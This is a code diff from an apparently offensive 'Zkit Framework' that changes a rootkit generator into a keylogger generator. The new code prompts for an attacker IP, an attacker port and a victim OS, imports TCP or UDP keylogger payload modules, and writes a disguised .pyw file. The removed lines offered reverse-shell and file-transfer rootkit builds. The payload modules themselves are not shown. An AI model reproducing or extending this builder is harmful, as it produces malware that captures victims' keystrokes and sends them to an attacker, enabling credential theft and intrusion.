@@ -1,18 +1,15 @@
 "Zkit Framework Rootkit generator . this module talks to _get_rootkit"
 import socket as s
 import sys
-from core.helper_core._core import Color, create_file, notify, ask_for
+from core.helper_core import Color, create_file, notify, ask_for # pylint: disable=C0415; # noqa
 from core.lib.randoms import random_str
-def get_rootkit():
+def get_keylogger():
     "Gets rootkit . talks with rootkit modules"
-    t_path = sys.path[0] + "\\Builded\\Rootkit\\"
+    k_path = sys.path[0] + "\\Builded\\KeyLogger\\"
     _, red, green, _, blue, _, _, _, reset = Color().GetAllColors()
-    print("Please Choose Rootkit Type:\n"
-          + red + "{1}--> Reverse Shell\n"
-          + green + '{2}--> File Transfer (+ Reverse Shell)\n' + reset)
-    r_type = str(input("..> "))
+
     print(
-        "A " + red + "RootKit" + reset + " ?"
+        "A " + red + "KeyLogger" + reset + " ?"
         + "What is The Connection Type : \n"
         + red + "{1}--> TCP\n"
         + green + "{2}--> UDP\n"
@@ -29,7 +26,7 @@ def get_rootkit():
         # Attacker_Port : An open port on attacker machine
 
         # Getting File PATH
-        u_path = t_path + ask_for("Enter A Name For Your File .\nIt Will Be --> {}".format(t_path) +
+        u_path = k_path + ask_for("Enter A Name For Your File .\nIt Will Be --> {}".format(k_path) +
                                   "YOUR_FILE_NAME.pyw : ", 'Using \\| As File Path',) + ".pyw"
 
         # Very important
@@ -60,20 +57,15 @@ def get_rootkit():
                                     default=[-1, 1534], type=int,
                                     )
             strs = []
-            for _ in range(0, 3):
+            # generating more then need
+            for _ in range(0, 6):
                 strs.append(random_str())
-            if r_type == '1':
-                if choice == 'TCP':
-                    import core.lib.payloads.rootkit.reverse_tcp as r # pylint: disable=C0415; # noqa
-                elif choice == 'UDP':
-                    import core.lib.payloads.rootkit.reverse_udp as r # pylint: disable=C0415; # noqa
-            elif r_type == '2':
-                if choice == 'TCP':
-                    import core.lib.payloads.rootkit.ft_tcp as r # pylint: disable=C0415; # noqa
-                elif choice == 'UDP':
-                    import core.lib.payloads.rootkit.ft_udp as r # pylint: disable=C0415; # noqa
+            if choice == 'TCP':
+                import core.lib.payloads.keylogger.tcp as k # pylint: disable=C0415; # noqa
+            elif choice == 'UDP':
+                import core.lib.payloads.keylogger.udp as k # pylint: disable=C0415; # noqa
 
-            return (r._get_rootkit( # pylint: disable=W0212; # noqa
+            return (k._get_keylogger( # pylint: disable=W0212; # noqa
                 attacker_ip, attacker_port, victim_os, strs), create_file(u_path))
     else:
         print("Port is either TCP or UDP but yours is not one.try again")
